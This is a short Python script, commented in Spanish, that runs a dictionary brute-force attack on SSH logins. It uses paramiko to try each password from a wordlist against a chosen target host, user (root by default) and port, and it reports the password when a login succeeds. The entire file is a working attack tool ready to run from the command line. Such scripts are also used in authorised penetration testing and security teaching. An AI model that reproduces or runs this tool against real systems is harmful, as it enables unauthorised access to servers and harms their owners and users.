#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""

                        ATAQUE POR FUERZA BRUTA A SSH


"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""

import paramiko
import socket
import argparse

"""
Definimos la funcion para el ataque por fuerza bruta
"""
def ataque_bruteforce(victima,usuario,puerto,diccionario):

    #Leemos el diccionario con las contraseñas que iremos probando
    try:
        dic = open(diccionario,"r")
        for contrasenia in dic:
            contrasenia = contrasenia[:-1]
            #Establecemos la conexion con SSH
            conexion_ssh = paramiko.SSHClient()
            #Añadimos la clave en caso de que sea la primera conexion (siempre es necesaria)
            conexion_ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                conexion_ssh.connect(victima,puerto,usuario,contrasenia)
                print("[+] Contraseña encontrada: %s" %contrasenia)
                break
            #No funciona la contraseña que hemos probado
            except paramiko.AuthenticationException:
                print("[-] Contraeña erronea: %s" %contrasenia)

            #Excepcion en caso de que no haya conexion
            except socket.error:
                print("[-] Fallo al establecer la conexión")
                break

        conexion_ssh.close()
    except IOError:
        print("[-] %s diccionario no encontrado " %diccionario)

def main():
    parser = argparse.ArgumentParser(description="SSH Bruteforce")
    parser.add_argument("-v", "--victima", dest="victima", type=str,help="Victima para hacer el ataque por fuerza bruta", metavar="IP/URL")
    parser.add_argument("-u", "--usuario", dest="usuario", type=str, help="Usuario para el que se probará el ataque por fuerza bruta", metavar="USERNAME",default="root")
    parser.add_argument("-p","--puerto", dest="puerto", type=int, help="Puerto para el que se probará el ataque por fuerza bruta", metavar="PUERTO", default=22)
    parser.add_argument("-d", "--diccionario", dest="diccionario", type=str, help="Diccionario para probar el ataque por fuerza bruta", metavar="DICCIONARIO")

    args = parser.parse_args()

    if args.victima and args.diccionario:
        ataque_bruteforce(args.victima,args.usuario,args.puerto,args.diccionario)
    else:
        parser.print_help()

"""
Programa principal
"""
if __name__ == "__main__":
    main()
